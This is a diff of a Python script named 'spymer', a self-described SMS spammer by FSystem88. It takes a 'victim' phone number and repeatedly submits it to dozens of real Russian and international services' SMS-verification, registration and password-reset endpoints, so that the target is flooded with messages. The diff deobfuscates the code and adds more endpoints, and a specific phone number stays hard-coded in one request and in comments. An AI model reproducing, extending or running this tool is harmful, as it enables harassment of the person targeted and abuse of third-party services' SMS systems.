@@ -1,9 +1,11 @@
 #!/usr/bin/python
-class spymer :#line:4
-	def main (OO00OOO0O0OO000OO ):#line:5
-		import requests ,random ,datetime ,sys ,time ,argparse #line:6
-		from colorama import Fore ,Back ,Style #line:7
-		print (Fore .GREEN +'''
+# spymer v3
+# Author: FSystem88
+class spymer:
+	def main(self):
+		import requests, random, datetime, sys, time, argparse
+		from colorama import Fore, Back, Style
+		print(Fore.GREEN + '''
 8888888888888888888888888
 8888888888888888888888888
 888        888        888
@@ -19,82 +21,119 @@ class spymer :#line:4
 8888888888888888888888888
 8888    FSystem88    8888
 8888   SMS Spammer   8888
-8888      v.5.5      8888
+8888   v.6 (final)   8888
 8888888888888888888888888
-8888888888888888888888888
-		''')#line:27
-		print (Style .RESET_ALL )#line:28
-		O00OOO000O0OOOOO0 =argparse .ArgumentParser (prog ='spymer',description ="Fucking shit by FSystem88. Возможно что-то уже не работает. Только для России!",epilog ='Мой e-mail - FSystem88@bk.ru')#line:29
-		O00OOO000O0OOOOO0 .add_argument ('phonenum',metavar ='phone',help ='Телефонный номер жертвы (пример: 79991234455)')#line:30
-		OO0O0O00O00O0O0OO =O00OOO000O0OOOOO0 .parse_args ()#line:31
-		def O0OO000OO00000OOO (O000000OOOOO00O00 ,type ='new'):#line:32
-			O0000OOO0O000OOO0 =datetime .datetime .now ().strftime ('%H:%M:%S')#line:33
-			OOO00O0000OO0O000 ='*'#line:34
-			if type =='warn':#line:35
-				OOO00O0000OO0O000 ='!'#line:36
-			else :#line:37
-				if type =='new':#line:38
-					OOO00O0000OO0O000 =='*'#line:39
-			O000000OOOOO00O00 ='['+OOO00O0000OO0O000 +']['+O0000OOO0O000OOO0 +']'+O000000OOOOO00O00 #line:40
-			return O000000OOOOO00O00 #line:41
-		def O0OO0O000OOO00OOO (O0O000O0OOOOOOO00 ,endspace =False ):#line:42
-			if endspace ==True :#line:43
-				return '['+O0O000O0OOOOOOO00 +'] '#line:44
-			return '['+O0O000O0OOOOOOO00 +']'#line:45
-		def O0OOOO000OOOO00O0 (O0O000OO00OOO0000 ):#line:46
-			try :#line:47
-				time .sleep (O0O000OO00OOO0000 )#line:48
-			except KeyboardInterrupt :#line:49
-				print ('\r'+O0OO000OO00000OOO (O0OO0O000OOO00OOO ('except',True )+'KeyboardInterrupt thrown! Exiting . . .','warn'))#line:50
-				exit ()#line:51
-		_OOOOO000000OO000O =OO0O0O00O00O0O0OO .phonenum #line:52
-		if _OOOOO000000OO000O [0 ]=='+':#line:53
-			_OOOOO000000OO000O =_OOOOO000000OO000O [1 :]#line:54
-		if _OOOOO000000OO000O [0 ]=='8':#line:55
-			_OOOOO000000OO000O ='7'+_OOOOO000000OO000O [1 :]#line:56
-		if _OOOOO000000OO000O [0 ]=='9':#line:57
-			_OOOOO000000OO000O ='7'+_OOOOO000000OO000O #line:58
-		if _OOOOO000000OO000O =='79153509908':#line:59
-			print ('\n                   ^\nSyntaxError: invalid syntax')#line:60
-			exit ()#line:61
-		_OO0O0O0O00O000O00 =''#line:62
-		for OOO000O00O00OO0O0 in range (12 ):#line:63
-			_OO0O0O0O00O000O00 =_OO0O0O0O00O000O00 +random .choice (list ('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))#line:64
-		O0OO0O0OOOO000O0O =0 #line:65
-		_OOO000OO0000O00O0 =_OOOOO000000OO000O [1 :]#line:66
-		_O0O00000OOOOOOOO0 ='+'+_OOOOO000000OO000O [0 ]+'('+_OOOOO000000OO000O [1 :4 ]+')'+_OOOOO000000OO000O [4 :7 ]+'-'+_OOOOO000000OO000O [7 :9 ]+'-'+_OOOOO000000OO000O [9 :11 ]#line:67
-		_OO0O000OOO00O0O00 =_OOO000OO0000O00O0 [:3 ]+'+'+_OOO000OO0000O00O0 [3 :6 ]+'-'+_OOO000OO0000O00O0 [6 :8 ]+'-'+_OOO000OO0000O00O0 [8 :10 ]#line:68
-		_O0O0OOOOOOOO000OO ='+'+_OOOOO000000OO000O [0 ]+'+('+_OOOOO000000OO000O [1 :4 ]+')'+_OOOOO000000OO000O [4 :7 ]+'-'+_OOOOO000000OO000O [7 :9 ]+'-'+_OOOOO000000OO000O [9 :11 ]#line:69
-		_O0OOO0O00O00OOOOO ='+'+_OOOOO000000OO000O [0 ]+' ('+_OOOOO000000OO000O [1 :4 ]+') '+_OOOOO000000OO000O [4 :7 ]+' '+_OOOOO000000OO000O [7 :9 ]+' '+_OOOOO000000OO000O [9 :11 ]#line:70
-		_O0O0O00OOOOOO0OOO =_OOOOO000000OO000O [1 :4 ]+') '+_OOOOO000000OO000O [4 :7 ]+'-'+_OOOOO000000OO000O [7 :9 ]+'-'+_OOOOO000000OO000O [9 :11 ]#line:71
-		print (O0OO000OO00000OOO (O0OO0O000OOO00OOO ('info',True )+('Отправка SMS на: +{}').format (_OOOOO000000OO000O )))#line:72
-		print ('Спамер запущен.\nЕсли Вы хотите остановить - нажмите Ctrl+Z.')#line:73
-		OO00OO000OO00OOO0 =1 #line:74
-		O0OO0O0OOOO000O0O =0 #line:75
-		while OO00OO000OO00OOO0 <10 :#line:76
-			_O0O0000O00O00O00O =_OO0O0O0O00O000O00 +f'{O0OO0O0OOOO000O0O}'+'@gmail.com'#line:77
-			OOO000O0000OOOO00 =requests .post ('https://p.grabtaxi.com/api/passenger/v2/profiles/register',data ={'phoneNumber':_OOOOO000000OO000O ,'countryCode':'ID','name':'test','email':'mail@mail.com','deviceToken':'*'},headers ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})#line:78
-			O00OO000OO00O0OOO =requests .post ('https://moscow.rutaxi.ru/ajax_keycode.html',data ={'l':_OOO000OO0000O00O0 }).json ()["res"]#line:79
-			OOO0000OOOOOOOOO0 =requests .post ('https://belkacar.ru/get-confirmation-code',data ={'phone':_OOOOO000000OO000O },headers ={})#line:80
-			OO0O0OOO0O00O00O0 =requests .post ('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data ={'phone_number':_OOOOO000000OO000O },headers ={})#line:81
-			O0OOO0O000O0O0O0O =requests .post ('https://app.karusel.ru/api/v1/phone/',data ={'phone':_OOOOO000000OO000O },headers ={})#line:82
-			OO0O00O00000O00O0 =requests .post ('https://api.tinkoff.ru/v1/sign_up',data ={'phone':'+'+_OOOOO000000OO000O },headers ={})#line:83
-			OO0OO00000O00000O =requests .post ('https://api.mtstv.ru/v1/users',json ={'msisdn':_OOOOO000000OO000O },headers ={})#line:84
-			O0OO0OOOO0O0O0OO0 =requests .post ('https://youla.ru/web-api/auth/request_code',data ={'phone':_OOOOO000000OO000O })#line:85
-			OOO00OOOO0O0O0OOO =requests .post ('https://pizzahut.ru/account/password-reset',data ={'reset_by':'phone','action_id':'pass-recovery','phone':_O0OOO0O00O00OOOOO ,'_token':'*'})#line:86
-			O00O0O000000OO0OO =requests .post ('https://www.rabota.ru/remind',data ={'credential':_OOOOO000000OO000O })#line:87
-			O00O000OO0O000000 =requests .post ('https://rutube.ru/api/accounts/sendpass/phone',data ={'phone':'+'+_OOOOO000000OO000O })#line:88
-			O00OO00O0000O0000 =requests .post ('https://www.citilink.ru/registration/confirm/phone/+'+_OOOOO000000OO000O +'/')#line:89
-			O0O0OOOO000000OOO =requests .post ('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',data ={'name':_OO0O0O0O00O000O00 ,'phone':_OOOOO000000OO000O ,'promo':'yellowforma'})#line:90
-			O00000000O0OOOO0O =requests .get ('https://www.oyorooms.com/api/pwa/generateotp?phone='+_OOO000OO0000O00O0 +'&country_code=%2B7&nod=4&locale=en')#line:91
-			O0OOOOO0O0OO0OOOO =requests .post ('https://newnext.ru/graphql',json ={'operationName':'registration','variables':{'client':{'firstName':'Иван','lastName':'Иванов','phone':_OOOOO000000OO000O ,'typeKeys':['Unemployed']}},'query':'mutation registration($client: ClientInput!) {' '\n  registration(client: $client) {' '\n    token\n    __typename\n  }\n}\n'})#line:92
-			O00000OOO00OOOOO0 =requests .post ('https://api.sunlight.net/v3/customers/authorization/',data ={'phone':_OOOOO000000OO000O })#line:93
-			OOOOOO00O0O0O0O00 =requests .post ('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json ={'client_type':'personal','email':_O0O0000O00O00O00O ,'mobile_phone':_OOOOO000000OO000O ,'deliveryOption':'sms'})#line:94
-			O0OO0OO0O0000OOOO =requests .post ('https://lk.invitro.ru/lk2/lka/patient/refreshCode',data ={'phone':_OOOOO000000OO000O })#line:95
-			OOOOO0OO00O0O0O0O =requests .post ('https://online.sbis.ru/reg/service/',json ={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_OOOOO000000OO000O },'id':'1'})#line:96
-			O0OO000000OOOO000 =requests .post ('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',json ={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone':_OOO000OO0000O00O0 ,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})#line:97
-			O0O0000O0O0OO0OO0 =requests .post ('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru',data ={'phone':_OOOOO000000OO000O })#line:98
-			O0OO0O0OOOO000O0O +=1 #line:99
-			print (('{} круг пройден.').format (O0OO0O0OOOO000O0O ))#line:100
-spammer =spymer ()#line:102
-spammer .main ()#line:103
+8888888888888888888888888'''+Style.RESET_ALL+Fore.BLUE+'''
+
+Спасибо Crinny за сервисы.
+https://github.com/crinny
+''')
+		print(Style.RESET_ALL)
+		parser = argparse.ArgumentParser(prog='spymer', description="Fucking shit by FSystem88. Возможно что-то уже не работает. Только для России!",epilog='Мой e-mail - FSystem88@bk.ru')
+		parser.add_argument('phonenum', metavar='phone', help='Телефонный номер жертвы (пример: 79991234455)')
+		args = parser.parse_args()
+		def showstatus(message, type='new'):
+			now = datetime.datetime.now().strftime('%H:%M:%S')
+			icon = '*'
+			if type == 'warn':
+				icon = '!'
+			else:
+				if type == 'new':
+					icon == '*'
+			message = '[' + icon + '][' + now + ']' + message
+			return message
+		def wrapsbrace(string, endspace=False):
+			if endspace == True:
+				return '[' + string + '] '
+			return '[' + string + ']'
+		def sleep(x):
+			try:
+				time.sleep(x)
+			except KeyboardInterrupt:
+				print('\r' + showstatus(wrapsbrace('except', True) + 'KeyboardInterrupt thrown! Exiting . . .', 'warn'))
+				exit()
+		_phone = args.phonenum
+		if _phone[0] == '+':
+			_phone = _phone[1:]
+		if _phone[0] == '8':
+			_phone = '7'+_phone[1:]
+		if _phone[0] == '9':
+			_phone = '7'+_phone
+		
+		_name = ''
+		for x in range(12):
+			_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+			password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+			username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+		iteration = 0			
+		_phone9 = _phone[1:]
+		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
+		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
+		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
+		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
+		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
+		print(showstatus(wrapsbrace('info', True) + ('Отправка SMS на: +{}').format(_phone)))
+		print('Спамер запущен.\nЕсли Вы хотите остановить - нажмите Ctrl+Z.')
+		i = 1
+		iteration = 0
+		while i < 10:
+			self.formatted_phone = _phone
+			_email = _name+f'{iteration}'+'@gmail.com'
+			email = _name+f'{iteration}'+'@gmail.com'
+			requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
+			requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
+			requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
+			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
+			requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
+			requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
+			requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
+			requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
+			requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
+			requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
+			requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
+			requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
+			requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
+			requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
+			requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': '+7 915 3509908','g-recaptcha-response': '','recaptcha': 'on'})
+			requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
+			requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
+			requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
+			requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
+			requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
+			requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
+			requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
+			requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': self.formatted_phone})
+			requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + self.formatted_phone})
+			requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
+			requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + self.formatted_phone, "api": 2, "email": "email","x-email": "x-email"})
+			requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": self.formatted_phone, "recaptcha": 'off', "g-recaptcha-response": ""})
+			requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + self.formatted_phone})
+			requests.post('https://plink.tech/register/',json={"phone": self.formatted_phone})
+			requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": self.formatted_phone})
+			requests.post("http://smsgorod.ru/sendsms.php",data={"number": self.formatted_phone})
+			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': self.formatted_phone})
+			requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": self.formatted_phone,"username": username})
+			requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': self.formatted_phone},headers={'App-ID': 'cabinet'})
+			requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": self.formatted_phone, "type": 2})
+			requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + self.formatted_phone})
+			requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': self.formatted_phone})
+			requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": self.formatted_phone, "deliveryOption": "sms"})
+			requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": self.formatted_phone})
+			requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": self.formatted_phone})
+			requests.post('https://belkacar.ru/get-confirmation-code',data={'phone': self.formatted_phone})
+			requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": self.formatted_phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
+			requests.post('https://www.citilink.ru/registration/confirm/phone/+' + self.formatted_phone + '/')
+			requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": self.formatted_phone, "SignupForm[device_type]": 3})
+			requests.get('https://findclone.ru/register', params={'phone': '+' + self.formatted_phone})
+			requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
+			requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': self.formatted_phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
+			requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + self.formatted_phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
+			requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + self.formatted_phone})
+			requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
+			requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": self.formatted_phone})
+			
+			iteration += 1
+			print(('{} круг пройден.').format(iteration))
+
+spammer = spymer()
+spammer.main()
